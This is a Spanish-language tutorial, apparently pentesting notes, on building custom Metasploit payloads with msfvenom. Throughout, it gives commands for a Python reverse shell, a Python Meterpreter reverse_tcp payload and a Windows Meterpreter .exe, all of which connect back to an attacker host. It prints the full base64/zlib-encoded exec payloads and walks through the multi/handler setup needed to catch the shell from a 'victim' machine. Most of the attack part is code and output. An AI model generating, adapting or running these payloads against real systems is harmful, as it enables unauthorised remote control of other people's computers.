# Metasploit (Creación de payloads personalizados)

Esta herramienta que viene con `metasploit` llamada `msfvenom` es un generador de `payloads`.

Si queremos crear por ejemplo un `payload` de `python` que haga una `reverse shell` podremos hacerlo de la siguiente forma:

```shell
msfvenom -p python/shell_reverse_tcp LHOST=192.168.16.128 LPORT=4444 
```

En el `LHOST` especificamos esa IP ya que es la IP de nuestra maquina a la que queremos que nos de la `shell` que se identifica con una `L` por delante y cuando es una `R` por delante es cuando nos referimos a la maquina victima.

Y el puerto puede ser el que queramos, pero de normal se suele utilizar el `4444`.

Si ejecutamos este comando, se nos generara un `payload` por terminal:

```
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 416 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNjk1rwzAMQM/2r/AtNstME8rIBj6UkUIZ28qae0ltlZqmtrGc7e/PXnOYQIcnPX3YW/AxMfT6ComNyJDapTSfQvQaEEs5UvQK5d3jKDfb4+6jH2qUh8/Xt+Nh+Oo37yJLUnvnQCfOq+a5lc1Tl1M2bVfV6xxC0J+LnYANcYYXSozKIxH0N29W7VpQYs9sAseNUGqV++QUYbxSElSUex9KRxrQ3gCv5nR+7CpR4wWmSZWFNSZjXVF3+76An9M/ghgXyoe8CvJu5Puj4eLhj7OzMCX5NQRnuBf0Fx2BXIM=')[0])))
```

Indicando que ese codigo ultimo, si lo ponemos en algun `exploit` que cree una `reverse shell` y lo utilizamos con ese `payload` veremos que funciona.

Si por ejemplo queremos utilizar el `interpreter` avanzado de `metepreter` que es el mas utilizado y el mejor, en vez de que nos de su autocontenido, lo podemos hacer de la siguiente forma para que nos lo de mas simple:

```shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.16.128 LPORT=4444 
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 436 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UN9LxDAMfl7/ir41xV65jTnuDieI+CAigndvIrJ1Uce6drQ9nYr/uy07DCQhyZcvP/pxsi5Qb9WAQXzrvhVt47EqhQ/uqIII/Yjk1To6095Q15g3hHzNdyQL7ivazNdLs1wcFOIU7x+u7172h8ebq3uecFJZY1AFAJZvC5lXm6gyLzZMlFF4ArUOm4FkOCucQmJP46XXiBOcc6LrZSt5NFOjBmCXt0x46VB9QCR4Wj+Trj7FmpPP914j1Wig4xc60nVn/9XVkuYEZ1SQDpcdKjtODr2H5QeyrcqU7DAhxQ/zbOd/OfkDcFRfaw==')[0])))
```

Y con ese codigo lo podremos adaptar a algun `exploit` que haya una `reverse shell` para que nos de el `meterpreter` y no una `shell` normal y simple, pudiendo utilizar las funciones de `meterpreter`.

Pero claro, al utilizar un `meterpreter` se necesita utilizar un `exploit` que pueda soportar este tipo de `shell` que se llama `handler` en `metasploit`, por lo que haremos lo siguiente:

```shell
msfconsole -q
```

Seleccionamos el `exploit` que queremos utilizar, en este caso es el `handler`.

```shell
use multi/handler
```

Y lo configuramos acorde a lo que hayamos creado con `msfvenom`, que en mi caso seria lo siguiente:

```shell
set LHOST 192.168.16.128
set LPORT 4444
set payload python/meterpreter/reverse_tcp
```

Y con esto configurado solo le tendremos que dar a `run` para ejecutarlo y que este a la escucha.

Mientras tanto con el otro `exploit`, con ese codigo insertado:

```
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UN9LxDAMfl7/ir41xV65jTnuDieI+CAigndvIrJ1Uce6drQ9nYr/uy07DCQhyZcvP/pxsi5Qb9WAQXzrvhVt47EqhQ/uqIII/Yjk1To6095Q15g3hHzNdyQL7ivazNdLs1wcFOIU7x+u7172h8ebq3uecFJZY1AFAJZvC5lXm6gyLzZMlFF4ArUOm4FkOCucQmJP46XXiBOcc6LrZSt5NFOjBmCXt0x46VB9QCR4Wj+Trj7FmpPP914j1Wig4xc60nVn/9XVkuYEZ1SQDpcdKjtODr2H5QeyrcqU7DAhxQ/zbOd/OfkDcFRfaw==')[0])))
```

Lo ejecutaremos y esto nos proporcionara una `shell` en el `handler` con el `meterpreter`, siendo todo mas comodo y mejor.

Tambien con `msfvenom` podemos generar ejecutables para diferentes sistemas operatvios, por ejemplo si queremos generar un `.exe` para `windows` podremos hacerlo de la siguiente forma:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.16.128 LPORT=4444 -f exe > shell.exe
```

Y con esto nos creara un ejecutable `.exe`, por lo que esto solo lo tendremos que pasar a la maquina `windows` y estando a la escucha en el `handler` solo tendriamos que ejecutarlo y obtendriamos una `shell` en este caso con `meterpreter` de la maquina victima `windows`.
